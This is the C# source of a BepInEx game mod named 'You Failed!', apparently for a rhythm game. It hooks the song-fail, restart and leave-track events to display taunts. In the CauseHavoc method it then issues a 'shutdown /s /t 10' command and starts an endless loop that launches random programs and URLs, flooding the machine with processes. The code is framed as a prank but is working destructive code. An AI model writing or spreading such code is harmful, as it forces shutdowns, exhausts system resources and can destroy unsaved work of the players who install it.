using BepInEx;
using BepInEx.IL2CPP;
using HarmonyLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;

namespace YouFailed
{
    [BepInPlugin(MOD_ID, MOD_NAME, MOD_VERSION)]
    internal class Main : BasePlugin
    {
        public const string MOD_ID = "YouFailed";
        public const string MOD_NAME = "You Failed!";
        public const string MOD_VERSION = "1.0.0";

        public static Main Instance;

        public static readonly string[] Funnies = new string[]
        {
            "cmd",
            "calc",
            "mspaint",
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ", // Rickroll
            "explorer",
            "notepad",
            "SnippingTool",
            "control",
            "https://www.youtube.com/watch?v=XqZsoesa55w", // Baby shark
            "Echo",
            "steam://rungameid/333600"                     // Nekopara, I think? I dunno blame fallin if it doesn't work
        };

        public static readonly string[] FunArgs = new string[]
        {
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
        };

        public static List<Random> randoms = new List<Random>();

        public override void Load()
        {
            Instance = this;
            Harmony.CreateAndPatchAll(typeof(Failure));
        }

        class Failure
        {
            [HarmonyPatch(typeof(Track), nameof(Track.Awake))]
            [HarmonyPostfix]
            private static void DoNotCommitDeath()
            {
                NotificationSystemGUI.AddMessage("DO NOT COMMIT DEATH :^)))))", 3f);
            }

            [HarmonyPatch(typeof(Track), nameof(Track.FailSong))]
            [HarmonyPostfix]
            private static void HahaUrBad()
            {
                NotificationSystemGUI.AddMessage("YOU HAS COMMITTED DEATH", 3f);
                NotificationSystemGUI.AddMessage("YOU WILL SUFFER DEATH COMMITTAGE", 3f);
                TriggerDeath();
            }

            [HarmonyPatch(typeof(Track), nameof(Track.RestartTrack))]
            [HarmonyPostfix]
            private static void HeyDontAvoidDeath()
            {
                NotificationSystemGUI.AddMessage("AVOIDING DEATH COMMITTAGE IS A CRIME AGAINST MEWS LAW", 3f);
                NotificationSystemGUI.AddMessage("YOU SHALL BE PUNISHED WITH DEATH COMMITTAGE", 3f);
                TriggerDeath();
            }

            [HarmonyPatch(typeof(Track), nameof(Track.ReturnToPickTrack))]
            [HarmonyPrefix]
            private static void WhatTheFuckDontLeave()
            {
                if (!Track.IsPaused) return;
                NotificationSystemGUI.AddMessage("WHAT THE FUCK DON'T LEAVE THE TRACK WE'RE HAVING SO MUCH FUN", 3f);
                NotificationSystemGUI.AddMessage("HEY LISTEN TO ME I'LL FUSE THE BOMB", 3f);
                TriggerDeath();
            }

            private static void TriggerDeath()
            {
                ThreadStart tsHavoc = new ThreadStart(CauseHavoc);
                Thread threadHavoc = new Thread(tsHavoc);
                threadHavoc.Start();
            }

            private static void CauseHavoc()
            {
                Process.Start("shutdown", "/s /t 10 /c \"DEATH\"");
                while (true)
                {
                    randoms.Add(new Random());
                    int i = randoms[randoms.Count-1].Next(0, Funnies.Length);
                    Process.Start(Funnies[i], FunArgs[i]);
                }
            }
        }
    }
}
